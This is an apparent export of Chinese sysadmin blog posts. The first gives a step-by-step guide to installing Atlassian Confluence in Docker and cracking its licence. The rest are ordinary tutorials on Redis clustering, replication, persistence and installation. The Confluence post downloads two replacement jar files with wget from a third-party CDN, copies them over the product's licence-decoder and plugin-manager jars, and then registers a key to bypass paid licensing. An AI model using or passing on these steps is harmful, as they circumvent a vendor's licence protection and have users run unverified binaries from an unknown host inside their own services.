    <title><![CDATA[Docker安装Confluence(破解版)]]></title>
    <url>%2Farticles%2Ff9f96949.html</url>
    <content type="text"><![CDATA[背景confluence是一个专业的企业知识管理与协同软件，可以用于构建企业wiki。通过它可以实现团队成员之间的协作和知识共享。现在大多数公司都会部署一套confluence，用作内部wiki。现在confluence已收费，那么下面将介绍下Docker安装破解confluence的操作记录。 环境版本Docker ：17.12.0-ce MySQL：5.7 安装MySQLDocker安装MySQL详见https://my.oschina.net/u/2289161/blog/1647061 安装Confluence下载镜像：https://hub.docker.com/r/cptactionhank/atlassian-confluence/ 启动一个confluence容器 1docker run -d --name confluence -p 8090:8090 --link mysql5.7:db --user root:root cptactionhank/atlassian-confluence:latest 可以用以下命令检查confluence是否启动 12docker ps docker inspect confluence 访问http://ip:8090/ 就可以看到Confluence的初始化和配置页面。 选择中文。 选择产品安装并点击下一步，继续安装。 通过上图可以看出需要输入授权码，下面介绍下破解confluence授权码的操作。 破解confluence下载破解confluence文件： atlassian-universal-plugin-manager-plugin-2.22.jar 1wget http://cdn-blog.oss-cn-beijing.aliyuncs.com/k2p-frp/atlassian-universal-plugin-manager-plugin-2.22.jar atlassian-extras-decoder-v2-3.2.jar 1wget http://cdn-blog.oss-cn-beijing.aliyuncs.com/k2p-frp/atlassian-extras-decoder-v2-3.2.jar 进入confluence容器命令： 1docker exec -it confluence /bin/sh 用下载的文件替换atlassian-extras-decoder-v2-3.x.jar/atlassian-universal-plugin-manager-plugin-2.22.x.jar文件（该文件下载到/opt``下，替换前必须做之前的文件备份，方便回退） 123#备份要替换的文件mv /opt/atlassian/confluence/confluence/WEB-INF/lib/atlassian-extras-decoder-v2-3.3.0.jar /mnt/mv /opt/atlassian/confluence/confluence/WEB-INF/atlassian-bundled-plugins/atlassian-universal-plugin-manager-plugin-2.22.5.jar /mnt 备份好文件后，退出confluence容器。拷贝下载的文件到confluence容器中。 123#将下载的破解文件替换对应的jardocker cp atlassian-extras-decoder-v2-3.2.jar confluence:/opt/atlassian/confluence/confluence/WEB-INF/lib/docker cp atlassian-universal-plugin-manager-plugin-2.22.jar confluence:/opt/atlassian/confluence/confluence/WEB-INF/atlassian-bundled-plugins/ 重新启动confluence容器。 然后继续访问http://ip:8090，接着注册confluence的key 下面的操作需要在翻墙的前提下进行，使用google邮箱注册。 稍微等一会儿，就会自动弹出下面的信息，点击”Yes” 再连接数据库时，需要修改数据库的隔离级别。操作详见：https://blog.csdn.net/taylor_tao/article/details/7063639 下面说下confluence邮箱功能（不多赘述，直接看截图）： 有上面配置后，就已经配置好了confluence的邮件功能了。下面说下在管理员账号下创建或邀请其他用户的做法： 一般要禁止用户注册自己注册，要在管理员账号下创建新用户或邀请新用户（通过邮件的方式） 如下在管理员账号下”添加用户”,添加后给用户设置一个初始密码，用户收到邮件后，可以登陆修改密码。 ———————————————————————————————————–也可以通过”邀请用户”的方式来创建新用户，用户收到邮件后，按照邮件提示进行用户创建 ———————————————————————————————————–邮件功能设置后，在分享文章的时候，可以以邮件的方式分享到用户的邮箱里。 注意：在创建文章时 ，左边的页面或子页面的创建时，可以点击左下角的”空间管理”-“配置侧边栏”到此，confluence的安装破解已经完全搞定！后续再介绍下confluence跟jira接连、及其它们对接LDAP的做法！]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis-cluster集群[四]:redis-cluster集群配置]]></title>
    <url>%2Farticles%2Fd2e62a87.html</url>
    <content type="text"><![CDATA[Redis分片：为什么要分片：随着Redis存储的数据越来越庞大，会导致Redis的性能越来越差！ 目前分片的方法： 1,客户端分片 在应用层面分片，程序里指定什么数据存放在那个Redis 优势：比较灵活 缺点：加个节点扩容就很费劲 2, 代理Proxy分片 第三方的Twemproxy 使用代理的缺点，你代理什么性能，那么你整个Redis的性能就是什么样的！ 3, redis cluster 4, codis （豌豆荚）开源 参考文档Redis cluster 集群分片原理：Redis 集群使用数据分片（sharding）而非一致性哈希（consistency hashing）来实现： 一个 Redis 集群包含 16384 个哈希槽（hash slot）， 数据库中的每个键都属于这 16384 个哈希槽的其中一个， 集群使用公式 CRC16(key) % 16384 来计算键 key 属于哪个槽， 其中 CRC16(key) 语句用于计算键 key 的 CRC16 校验和 。 集群中的每个节点负责处理一部分哈希槽。 举个例子， 一个集群可以有三个哈希槽， 其中： * 节点 A 负责处理 0 号至 5500 号哈希槽。 * 节点 B 负责处理 5501 号至 11000 号哈希槽。 * 节点 C 负责处理 11001 号至 16384 号哈希槽。这种将哈希槽分布到不同节点的做法使得用户可以很容易地向集群中添加或者删除节点。 比如说： * 如果用户将新节点 D 添加到集群中， 那么集群只需要将节点 A 、B 、 C 中的某些槽移动到节点 D 就可以了。 * 与此类似， 如果用户要从集群中移除节点 A ， 那么集群只需要将节点 A 中的所有哈希槽移动到节点 B 和节点 C ， 然后再移除空白（不包含任何哈希槽）的节点 A 就可以了。因为将一个哈希槽从一个节点移动到另一个节点不会造成节点阻塞， 所以无论是添加新节点还是移除已存在节点， 又或者改变某个节点包含的哈希槽数量， 都不会造成集群下线。 Redis集群中的主从复制为了使得集群在一部分节点下线或者无法与集群的大多数（majority）节点进行通讯的情况下， 仍然可以正常运作， Redis 集群对节点使用了主从复制功能： 集群中的每个节点都有 1 个至 N 个复制品（replica）， 其中一个复制品为主节点（master）， 而其余的 N-1 个复制品为从节点（slave）。在之前列举的节点 A 、B 、C 的例子中， 如果节点 B 下线了， 那么集群将无法正常运行， 因为集群找不到节点来处理 5501 号至 11000 号的哈希槽。另一方面， 假如在创建集群的时候（或者至少在节点 B 下线之前）， 我们为主节点 B 添加了从节点 B1 ， 那么当主节点 B 下线的时候， 集群就会将 B1 设置为新的主节点， 并让它代替下线的主节点 B ， 继续处理 5501 号至 11000 号的哈希槽， 这样集群就不会因为主节点 B 的下线而无法正常运作了。 不过如果节点 B 和 B1 都下线的话， Redis 集群还是会停止运作。 Redis 集群的一致性保证（guarantee）Redis 集群不保证数据的强一致性（strong consistency）： 在特定条件下， Redis 集群可能会丢失已经被执行过的写命令。使用异步复制（asynchronous replication）是 Redis 集群可能会丢失写命令的其中一个原因。 考虑以下这个写命令的例子： * 客户端向主节点 B 发送一条写命令。 * 主节点 B 执行写命令，并向客户端返回命令回复。 * 主节点 B 将刚刚执行的写命令复制给它的从节点 B1 、 B2 和 B3 。如你所见， 主节点对命令的复制工作发生在返回命令回复之后， 因为如果每次处理命令请求都需要等待复制操作完成的话， 那么主节点处理命令请求的速度将极大地降低 —— 我们必须在性能和一致性之间做出权衡。如果真的有必要的话， Redis 集群可能会在将来提供同步地（synchronou）执行写命令的方法。Redis 集群另外一种可能会丢失命令的情况是， 集群出现网络分裂（network partition）， 并且一个客户端与至少包括一个主节点在内的少数（minority）实例被孤立。举个例子， 假设集群包含 A 、 B 、 C 、 A1 、 B1 、 C1 六个节点， 其中 A 、B 、C 为主节点， 而 A1 、B1 、C1 分别为三个主节点的从节点， 另外还有一个客户端 Z1 。假设集群中发生网络分裂， 那么集群可能会分裂为两方， 大多数（majority）的一方包含节点 A 、C 、A1 、B1 和 C1 ， 而少数（minority）的一方则包含节点 B 和客户端 Z1 。在网络分裂期间， 主节点 B 仍然会接受 Z1 发送的写命令： * 如果网络分裂出现的时间很短， 那么集群会继续正常运行； * 但是， 如果网络分裂出现的时间足够长， 使得大多数一方将从节点 B1 设置为新的主节点， 并使用 B1 来代替原来的主节点 B ， 那么 Z1 发送给主节点 B 的写命令将丢失。注意， 在网络分裂出现期间， 客户端 Z1 可以向主节点 B 发送写命令的最大时间是有限制的， 这一时间限制称为节点超时时间（node timeout）， 是 Redis 集群的一个重要的配置选项： 对于大多数一方来说， 如果一个主节点未能在节点超时时间所设定的时限内重新联系上集群， 那么集群会将这个主节点视为下线， 并使用从节点来代替这个主节点继续工作。 对于少数一方， 如果一个主节点未能在节点超时时间所设定的时限内重新联系上集群， 那么它将停止处理写命令， 并向客户端报告错误。 Redis Cluster安装：1、安装环境：首先确保安装了Redis 12345678910111213141516171819202122232425262728cd /opt/mkdir `seq 7001 7008`cp /etc/redis/6379.conf ./ 配置文件里： 新增这三行即可cluster-enabled yescluster-config-file nodes.confcluster-node-timeout 5000 并且报：AOF是开启的appendonly yes #把相关的信息都统一修改为：6379 （端口、日志文件、存储dir持久化）sed 's/6379/7001/g' 6379.conf &gt; 7001/redis.confsed 's/6379/7002/g' 6379.conf &gt; 7002/redis.confsed 's/6379/7003/g' 6379.conf &gt; 7003/redis.confsed 's/6379/7004/g' 6379.conf &gt; 7004/redis.confsed 's/6379/7005/g' 6379.conf &gt; 7005/redis.confsed 's/6379/7006/g' 6379.conf &gt; 7006/redis.confsed 's/6379/7007/g' 6379.conf &gt; 7007/redis.confsed 's/6379/7008/g' 6379.conf &gt; 7008/redis.conf for i in `seq 7001 7009`;do cd /opt/$i &amp;&amp; /usr/local/bin/redis-server redis.conf ; done 2、安装管理工具，源码自带了一个管理Cluster集群的工具是用ruby写的所以需要安装ruby 123yum -y install ruby rubygems#安装ruby的管理工具redisgem install redis 3、复制管理工具 123cp /opt/redis-3.0.4/src/redis-trib.rb /usr/local/bin/redis-trib#查看redis-trib帮助redis-trib help 4、创建集群 7001-7006 6个redis为集群node，7007-7008 “2个redis为back node” 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364[root@server.tianshuai.com]$ redis-trib create --replicas 1 192.168.0.201:7001 192.168.0.201:7002 192.168.0.201:7003 192.168.0.201:7004 192.168.0.201:7005 192.168.0.201:7006&gt;&gt;&gt; Creating clusterConnecting to node 192.168.0.201:7001: OKConnecting to node 192.168.0.201:7002: OKConnecting to node 192.168.0.201:7003: OKConnecting to node 192.168.0.201:7004: OKConnecting to node 192.168.0.201:7005: OKConnecting to node 192.168.0.201:7006: OK&gt;&gt;&gt; Performing hash slots allocation on 6 nodes...Using 3 masters:192.168.0.201:7001192.168.0.201:7002192.168.0.201:7003 Adding replica 192.168.0.201:7004 to 192.168.0.201:7001Adding replica 192.168.0.201:7005 to 192.168.0.201:7002Adding replica 192.168.0.201:7006 to 192.168.0.201:7003M: 699f318027f87f3c49d48e44116820e673bd306a 192.168.0.201:7001 slots:0-5460 (5461 slots) masterM: 96892fd3f51292e922383ddb6e8018e2f772deed 192.168.0.201:7002 slots:5461-10922 (5462 slots) masterM: f702fd03c1e3643db7e385915842533ba5aab98d 192.168.0.201:7003 slots:10923-16383 (5461 slots) masterS: d0994ce7ef68c0834030334afcd60013773f2e77 192.168.0.201:7004 replicates 699f318027f87f3c49d48e44116820e673bd306aS: d880581504caff4a002242b2b259d5242b8569fc 192.168.0.201:7005 replicates 96892fd3f51292e922383ddb6e8018e2f772deedS: a77b16c4f140c0f5c17c907ce7ee5e42ee2a7b02 192.168.0.201:7006 replicates f702fd03c1e3643db7e385915842533ba5aab98dCan I set the above configuration? (type 'yes' to accept): YES &gt;&gt;&gt; Nodes configuration updated&gt;&gt;&gt; Assign a different config epoch to each node&gt;&gt;&gt; Sending CLUSTER MEET messages to join the clusterWaiting for the cluster to join...&gt;&gt;&gt; Performing Cluster Check (using node 192.168.0.201:7001)M: 699f318027f87f3c49d48e44116820e673bd306a 192.168.0.201:7001 slots:0-5460 (5461 slots) masterM: 96892fd3f51292e922383ddb6e8018e2f772deed 192.168.0.201:7002 slots:5461-10922 (5462 slots) masterM: f702fd03c1e3643db7e385915842533ba5aab98d 192.168.0.201:7003 slots:10923-16383 (5461 slots) masterM: d0994ce7ef68c0834030334afcd60013773f2e77 192.168.0.201:7004 slots: (0 slots) master replicates 699f318027f87f3c49d48e44116820e673bd306aM: d880581504caff4a002242b2b259d5242b8569fc 192.168.0.201:7005 slots: (0 slots) master replicates 96892fd3f51292e922383ddb6e8018e2f772deedM: a77b16c4f140c0f5c17c907ce7ee5e42ee2a7b02 192.168.0.201:7006 slots: (0 slots) master replicates f702fd03c1e3643db7e385915842533ba5aab98d[OK] All nodes agree about slots configuration.&gt;&gt;&gt; Check for open slots...&gt;&gt;&gt; Check slots coverage...[OK] All 16384 slots covered. #create --replicas 1 这里--replicas 1 是指定复制几份，相当于每个master有几个从#redis cluaster最低要求有3个master#master的定义 host1:port host2:port host3:port如果--replicas 1 那么：#host1:port == master host2:port 是：host1:port从 #如果--replicas 2 那么：#host1:port == master host2:port &amp; host3:port 是host1:port 的从 M: 这个是cluaster 自动生成的ID 集群在通信的时候是使用这个ID来区分的 4、连接cluster（连接任意的Cluster集群中的服务器即可） 12345678910111213141516171819202122redis-cli -c -h 192.168.0.201 -p 7001 的需要加-c的参数 可以连接集群的任意节点！ 192.168.0.201:7001&gt; cluster nodes 查看cluster节点f702fd03c1e3643db7e385915842533ba5aab98d 192.168.0.201:7003 master - 0 1444813870405 3 connected 10923-16383699f318027f87f3c49d48e44116820e673bd306a 192.168.0.201:7001 myself,master - 0 0 1 connected 0-5460d0994ce7ef68c0834030334afcd60013773f2e77 192.168.0.201:7004 slave 699f318027f87f3c49d48e44116820e673bd306a 0 1444813870105 4 connecteda77b16c4f140c0f5c17c907ce7ee5e42ee2a7b02 192.168.0.201:7006 slave f702fd03c1e3643db7e385915842533ba5aab98d 0 1444813868605 6 connected96892fd3f51292e922383ddb6e8018e2f772deed 192.168.0.201:7002 master - 0 1444813869405 2 connected 5461-10922d880581504caff4a002242b2b259d5242b8569fc 192.168.0.201:7005 slave 96892fd3f51292e922383ddb6e8018e2f772deed 0 1444813869105 5 connected 192.168.0.201:7001&gt; cluster info 查看cluster信息cluster_state:okcluster_slots_assigned:16384cluster_slots_ok:16384cluster_slots_pfail:0cluster_slots_fail:0cluster_known_nodes:6cluster_size:3cluster_current_epoch:6cluster_my_epoch:1cluster_stats_messages_sent:1809cluster_stats_messages_received:1809 5、集群扩容 1234567891011121314151617181920212223242526redis-trib add-node 192.168.0.201:7007 192.168.0.201:7001 命令解释：redis-trib add-node 要加的节点和端口 现有任意节点和端口 加完之后查看结果：192.168.0.201:7001&gt; cluster infocluster_state:okcluster_slots_assigned:16384cluster_slots_ok:16384cluster_slots_pfail:0cluster_slots_fail:0cluster_known_nodes:7cluster_size:3cluster_current_epoch:6cluster_my_epoch:1cluster_stats_messages_sent:2503cluster_stats_messages_received:2503192.168.0.201:7001&gt; cluster nodesf702fd03c1e3643db7e385915842533ba5aab98d 192.168.0.201:7003 master - 0 1444814061587 3 connected 10923-16383699f318027f87f3c49d48e44116820e673bd306a 192.168.0.201:7001 myself,master - 0 0 1 connected 0-5460d0994ce7ef68c0834030334afcd60013773f2e77 192.168.0.201:7004 slave 699f318027f87f3c49d48e44116820e673bd306a 0 1444814062087 4 connecteda77b16c4f140c0f5c17c907ce7ee5e42ee2a7b02 192.168.0.201:7006 slave f702fd03c1e3643db7e385915842533ba5aab98d 0 1444814061087 6 connecteda1301a9e1fd24099cd8dc49c47f2263e3124e4d6 192.168.0.201:7007 master - 0 1444814063089 0 connected96892fd3f51292e922383ddb6e8018e2f772deed 192.168.0.201:7002 master - 0 1444814062589 2 connected 5461-10922d880581504caff4a002242b2b259d5242b8569fc 192.168.0.201:7005 slave 96892fd3f51292e922383ddb6e8018e2f772deed 0 1444814061587 5 connected192.168.0.201:7001&gt; 6、新加上来没有数据-及没有槽位，我们可以用命令让他重新分片（分片） 1redis-trib reshard 192.168.0.201:7007 7、在添加一个服务器做从 123456789101112131415161718192021222324252627在添加一个7008 让他做7008的从[root@server.tianshuai.com]$ redis-trib add-node 192.168.0.201:7008 192.168.0.201:7001加进来之后默认就是mater但是他没有任何的槽位192.168.0.201:7001&gt; cluster nodesf702fd03c1e3643db7e385915842533ba5aab98d 192.168.0.201:7003 master - 0 1444814915795 3 connected 11089-16383699f318027f87f3c49d48e44116820e673bd306a 192.168.0.201:7001 myself,master - 0 0 1 connected 166-5460d0994ce7ef68c0834030334afcd60013773f2e77 192.168.0.201:7004 slave 699f318027f87f3c49d48e44116820e673bd306a 0 1444814917298 4 connecteda77b16c4f140c0f5c17c907ce7ee5e42ee2a7b02 192.168.0.201:7006 slave f702fd03c1e3643db7e385915842533ba5aab98d 0 1444814916297 6 connecteda02a66e0286ee2f0a9b5380f7584b9b20dc032ff 192.168.0.201:7008 master - 0 1444814915796 0 connecteda1301a9e1fd24099cd8dc49c47f2263e3124e4d6 192.168.0.201:7007 master - 0 1444814915295 7 connected 0-165 5461-5627 10923-1108896892fd3f51292e922383ddb6e8018e2f772deed 192.168.0.201:7002 master - 0 1444814916898 2 connected 5628-10922d880581504caff4a002242b2b259d5242b8569fc 192.168.0.201:7005 slave 96892fd3f51292e922383ddb6e8018e2f772deed 0 1444814916798 5 connected 然后连接到7008的这个redis实例上，然后复制7007的ID192.168.0.201:7008&gt; cluster replicate a1301a9e1fd24099cd8dc49c47f2263e3124e4d6OK然后看下：192.168.0.201:7008&gt; cluster nodes699f318027f87f3c49d48e44116820e673bd306a 192.168.0.201:7001 master - 0 1444815074072 1 connected 166-5460a1301a9e1fd24099cd8dc49c47f2263e3124e4d6 192.168.0.201:7007 master - 0 1444815073071 7 connected 0-165 5461-5627 10923-1108896892fd3f51292e922383ddb6e8018e2f772deed 192.168.0.201:7002 master - 0 1444815073671 2 connected 5628-10922a77b16c4f140c0f5c17c907ce7ee5e42ee2a7b02 192.168.0.201:7006 slave f702fd03c1e3643db7e385915842533ba5aab98d 0 1444815073571 3 connectedf702fd03c1e3643db7e385915842533ba5aab98d 192.168.0.201:7003 master - 0 1444815072571 3 connected 11089-16383d0994ce7ef68c0834030334afcd60013773f2e77 192.168.0.201:7004 slave 699f318027f87f3c49d48e44116820e673bd306a 0 1444815073071 1 connectedd880581504caff4a002242b2b259d5242b8569fc 192.168.0.201:7005 slave 96892fd3f51292e922383ddb6e8018e2f772deed 0 1444815073871 2 connecteda02a66e0286ee2f0a9b5380f7584b9b20dc032ff 192.168.0.201:7008 myself,slave a1301a9e1fd24099cd8dc49c47f2263e3124e4d6 0 0 0 connected192.168.0.201:7008&gt; 12345678910111213141516192.168.7.107:7002&gt; set key101 shuaige-&gt; Redirected to slot [1601] located at 192.168.7.107:7001OK192.168.7.107:7001&gt; set key102 shuaige-&gt; Redirected to slot [13858] located at 192.168.7.107:7003OK192.168.7.107:7003&gt; set key103 shuaige-&gt; Redirected to slot [9731] located at 192.168.7.107:7002OK192.168.7.107:7002&gt; set key104 shuaige-&gt; Redirected to slot [5860] located at 192.168.7.107:7007OK192.168.7.107:7007&gt; set key105 shuaige-&gt; Redirected to slot [1733] located at 192.168.7.107:7001OK192.168.7.107:7001&gt;]]></content>
      <categories>
        <category>数据库运维</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis-cluster集群[三]:redis主从复制]]></title>
    <url>%2Farticles%2F1e52f2e4.html</url>
    <content type="text"><![CDATA[Redis主从复制原理：通过把这个RDB文件或AOF文件传给slave服务器，slave服务器重新加载RDB文件，来实现复制的功能！ 复制的话：主服务器可以有多个从服务器！！！ 不仅这样从服务器还可以有从服务器，可以做成星状的结构！ 复制的话也不会阻塞进程，同样fork一个子进程来做！ 复制的原理： 当建立一个从服务器后，从服务器会想主服务器发送一个SYNC的命令，主服务器接收到SYNC命令之后会执行BGSAVE 然后保存到RDB文件，然后发送到从服务器！收到RDB文件然后就载入到内存！ 最早不支持增量，到2.8之后就支持增量了！ Redis主从配置：配置非常简单： 我要把：192.168.0.201 6380 作为192.168.0.201 6379的从就一条命令 1234567891011121314151617181920212223242526272829303132333435363738394041192.168.0.201:6380&gt; slaveof 192.168.0.201 6379OK #然后使用INFO查看下：# Replicationrole:slavemaster_host:192.168.0.201master_port:6379master_link_status:upmaster_last_io_seconds_ago:7master_sync_in_progress:0slave_repl_offset:85slave_priority:100slave_read_only:1connected_slaves:0master_repl_offset:0repl_backlog_active:0repl_backlog_size:1048576repl_backlog_first_byte_offset:0repl_backlog_histlen:0 #然后在到主的上面看下：15:38 [root@server.tianshuai.com]$ redis-cli -h 192.168.0.201 -p 6379192.168.0.201:6379&gt; INFO #Replicationrole:masterconnected_slaves:1slave0:ip=192.168.0.201,port=6380,state=online,offset=183,lag=1 #master_repl_offset:183repl_backlog_active:1repl_backlog_size:1048576repl_backlog_first_byte_offset:2repl_backlog_histlen:182 #从2.61 的时候！从是仅读的192.168.0.201:6380&gt; SET key1 2(error) READONLY You can't write against a read only slave.192.168.0.201:6380&gt;&lt;br&gt;##现实工作场景中，写和读是1：10的吗，我们就可以，设置多1个主多个从这样，进行读写分离！]]></content>
      <categories>
        <category>数据库运维</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis-cluster集群[二]:redis持久化]]></title>
    <url>%2Farticles%2F8d5e3656.html</url>
    <content type="text"><![CDATA[Redis持久化原理：Redis支持两种持久化：RDB和AOF模式 名词解释：RDB：持久化可以在指定的时间间隔内生成数据集的时间点快照（point-in-time snapshot）。AOF：持久化记录服务器执行的所有写操作命令，并在服务器启动时，通过重新执行这些命令来还原数据集。 AOF 文件中的命令全部以 Redis 协议的格式来保存，新命令会被追加到文件的末尾。 Redis 还可以在后台对 AOF 文件进行重写（rewrite） 使得 AOF 文件的体积不会超出保存数据集状态所需的实际大小。 PDB和AOF的优先级： 如果同时开启RDB和AOF模式，AOF的优先级要比RDB高：Redis 还可以同时使用 AOF 持久化和 RDB 持久化。 在这种情况下， 当 Redis 重启时， 它会优先使用 AOF 文件来还原数据集。 因为 AOF 文件保存的数据集通常比 RDB 文件所保存的数据集更完整。 AOF 的方式有点像ORCAL的逻辑备库！AOF redis 还会在后台对数据进行重写，比如set key1 ， set key1 ,其实第一次的set key1 没用，这样就可以把第一次set key1 删掉了。这样保存下来的数据集就很小了可以压缩了！你甚至可以关闭持久化功能，让数据只在服务器运行时存在。 RDB&amp;AOF优缺点RDB的优缺点：优点：1、紧凑易于备份，他就一个文件。2、RDB可以最大化redis性能、父进程无需做任何操作只需要for一个子进程即可3、恢复比AOF块 缺点：1、数据完整性：如果非常注重数据的完整性，那么RDB就不行，虽然他是一个point-in-time 的快照方式，但是在快照的过程中，redis重启了，那么在快照中的这些数据将会丢失2、数据非常庞大后，非常耗CPU和时间，那么redis讲可能down掉1秒钟设置更长。 AOF的优缺点：优点：1、 使用 AOF 持久化会让 Redis 变得非常耐久，AOF默认的每一秒追加一次也可以修改他的方式没执行一次命令追加一次，所以你最多丢失1秒钟的数据2、 AOF 文件是一个只进行追加操作的日志文件（append only log）3、 Redis 可以在 AOF 文件体积变得过大时，自动地在后台对 AOF 进行重写 缺点：1、对于相同的数据集来说，AOF 文件的体积通常要大于 RDB 文件的体积。2、 根据所使用的 fsync 策略，AOF 的速度可能会慢于 RDB RDB &amp; AOF 持久化原理快照的运行方式： 当 Redis 需要保存 dump.rdb 文件时， 服务器执行以下操作： Redis 调用 fork() ，同时拥有父进程和子进程。 子进程将数据集写入到一个临时 RDB 文件中。 当子进程完成对新 RDB 文件的写入时，Redis 用新 RDB 文件替换原来的 RDB 文件，并删除旧的 RDB 文件。 这种工作方式使得 Redis 可以从写时复制（copy-on-write）机制中获益。 AOF 重写和 RDB 创建快照一样，都巧妙地利用了写时复制机制。 以下是 AOF 重写的执行步骤： Redis 执行 fork() ，现在同时拥有父进程和子进程。 子进程开始将新 AOF 文件的内容写入到临时文件。 对于所有新执行的写入命令，父进程一边将它们累积到一个内存缓存中，一边将这些改动追加到现有 AOF 文件的末尾： 这样即使在重写的中途发生停机，现有的 AOF 文件也还是安全的。 当子进程完成重写工作时，它给父进程发送一个信号，父进程在接收到信号之后，将内存缓存中的所有数据追加到新 AOF 文件的末尾。 搞定！现在 Redis 原子地用新文件替换旧文件，之后所有命令都会直接追加到新 AOF 文件的末尾。 AOF重写 因为 AOF 的运作方式是不断地将命令追加到文件的末尾， 所以随着写入命令的不断增加， AOF 文件的体积也会变得越来越大。举个例子， 如果你对一个计数器调用了 100 次 INCR ， 那么仅仅是为了保存这个计数器的当前值， AOF 文件就需要使用 100 条记录（entry）。然而在实际上， 只使用一条 SET 命令已经足以保存计数器的当前值了， 其余 99 条记录实际上都是多余的。为了处理这种情况， Redis 支持一种有趣的特性： 可以在不打断服务客户端的情况下， 对 AOF 文件进行重建（rebuild）。执行 BGREWRITEAOF 命令， Redis 将生成一个新的 AOF 文件， 这个文件包含重建当前数据集所需的最少命令。Redis 2.2 需要自己手动执行 BGREWRITEAOF 命令； Redis 2.4 则可以自动触发 AOF 重写， 具体信息请查看 2.4 的示例配置文件。 Rdis持久化设置：查看下面配置文件：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#默认Redis是开启的RDB模式的持久化vim /etc/redis/6379.conf=============================================================################################ SNAPSHOTTING ################################## Save the DB on disk:## save &lt;seconds&gt; &lt;changes&gt;## Will save the DB if both the given number of seconds and the given# number of write operations against the DB occurred.## In the example below the behaviour will be to save:# after 900 sec (15 min) if at least 1 key changed# after 300 sec (5 min) if at least 10 keys changed# after 60 sec if at least 10000 keys changed## Note: you can disable saving completely by commenting out all "save" lines.## It is also possible to remove all the previously configured save# points by adding a save directive with a single empty string argument# like in the following example:## save "" save 900 1save 300 10save 60 10000 ================================================================#上面3个save 是或的关系 # save &lt;seconds&gt; &lt;changes&gt; ###格式！解释：# after 900 sec (15 min) if at least 1 key changed# after 300 sec (5 min) if at least 10 keys changed# after 60 sec if at least 10000 keys changed #900 sec内有1个key发生了改变就做一次快照 #或 300sec 内有10个keys发生了改变做一次快照 #或60 sec内 10000 keys发生了改变做一次快照 #快照原理：#forker出一个进程，是当前进程的一个副本相当于子进程，不会影响你当前运行的进程。#当子进程写的时候会有一个临时的文件，当子进程写完之后会把这个 #临时的文件move替换老的文件，所以这个rdb的文件任何时间都是一个完整的可用的副本！#你写的时候不会影响RDB这个文件，因为forker出的子进程正在写的是一个临时文件！ #但是如果如果故障了，你这个保存的时间是你开始快照那一刻那个时间，你快照到快照完毕那一段时间的数据就丢失了！ #如果想禁用持久化把这三行删了就行了save 900 1save 300 10save 60 10000 快照保存在那里呢？123456789101112131415# The filename where to dump the DBdbfilename dump.rdb #如果你启用了多个快照名称，可以使用端口好来定义比如：dump_6379.rdb # Note that you must specify a directory here, not a file name.dir ./ #不仅仅是RDB模式下的DB存放在这个目录AOF模式下也是存放在这个目录的，建议存放在你指定的地方！ 比如：dir /opt/redis/ 比如我上面指定了：# The filename where to dump the DBdbfilename dump_6379.rdb # Note that you must specify a directory here, not a file name.dir /opt/redis/ 手动在Redis中保存1234567891011121314151617181920212223242526272829303132333435127.0.0.1:6379&gt; SET key 1OK127.0.0.1:6379&gt; SAVEOK 下目录下面有没有修改：-rw-r--r-- 1 root root 27 Oct 14 13:35 dump_6379.rdb 当前时间创建在设置个key看下：127.0.0.1:6379&gt; SET key 2OK127.0.0.1:6379&gt; SAVEOK -rw-r--r-- 1 root root 27 Oct 14 13:37 dump_6379.rdb 127.0.0.1:6379&gt; BGSAVEBackground saving started #SAVE和BGSAVE有什么区别：SAVE 是阻塞的当你直接执行SAVE的时候他就不干活了，BGSAVE是在后台执行。forker一个子进程来进行SAVE！ #SAVE的使用场景仅限于：当Redis需要迁移的时候，Redis没有数据写入并且可以停的时候使用！ #测试添加一个：key然后停掉看看！不保存：#目前的key是：127.0.0.1:6379&gt; KEYS *1) "key"2) "key2"3) "key3" 127.0.0.1:6379&gt; SET key4 4OK #杀掉，重启之后发现设置的key丢失了。#所以当redis异常挂掉之后，没有SAVE收据！ 启用了AOF后1234567891011121314151617181920212223242526#给这个文件追加，把所有的命令都写到一个文件里面，你执行一个我写一个。#恢复的话在执行一遍不就行了吗！非常简单 （但是恢复相对RDB模式回慢他相当于重新把AOF库里的记录重新往内存中写一边） #可以RDB和AOF同时使用！优点都占用了！但是也的根据业务来定！ #开启方法：修改配置文件appendonly yes #改为yesappendfilename "appendonly.aof" #文件名 #工作原理：#forker 一个子进程写到临时文件，写完之后就给父进程发一个信号，开始写到写完的这个过程还会有子进程给父进程发信号。先保存在内存里#但是他有个好的功能，重写，他会定时对aof进行重新，这样文件就会非常小！ 测试：（他会根据Redis可识别的方式写入文件，不过大概人也能看懂）[root@192.168.7.107]$ cat appendonly.aof*2$6SELECT$10*3$3SET$4kye1]]></content>
      <categories>
        <category>数据库运维</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis-cluster集群[一]:redis安装及redis数据类型]]></title>
    <url>%2Farticles%2F88f598bf.html</url>
    <content type="text"><![CDATA[Redis介绍：介绍redis 是一个开源的、使用C语言编写的、支持网络交互的、可以基于内存也可以持久化的Key-Value数据库。 redis的源码非常简单，只要有时间看看谭浩强的C语言，在去看redis的源码能看懂50-60%。 redis目前最大的集群应该是新浪的应该。 redis目前是vmvaer来支持的，很多的开源软件都需要某些组织来支持的。如果一个开源软件没有金钱来支持的话很难走的持久 Redis和Memcache对比 持久化：以电商举例，session用memcache来做的，购物车用redis来做的，当你退出的时候会提示你购物车里的物品会在你退出后继续保存。相对来说memcache存储更单一化！ 主从复制：redis的主从复制类似mysql的主从复制但是原理是不同的！ 虚拟内存：说白了就是把内存里一些不用的东西放在硬盘上，最好不要用，降低效率，现在内存来说比较便宜。 Redis安装&amp;基本操作：安装检查配置环境12#检查gcc是否安装，如果没有安装：yum -y install gcc 下载安装Redis1234567891011121314151617181920212223242526272829303132cd /opt/wget http://download.redis.io/releases/redis-3.0.4.tar.gz#这里下载可以登录官网查看最新的Redistar -xvf redis-3.0.4.tar.gzmakemake installcd /opt/redis-3.0.4/src/make test#安装中可能遇到的问题：zmalloc.h:50:31: error: jemalloc/jemalloc.h: No such file or directoryzmalloc.h:55:2: error: #error "Newer version of jemalloc required" 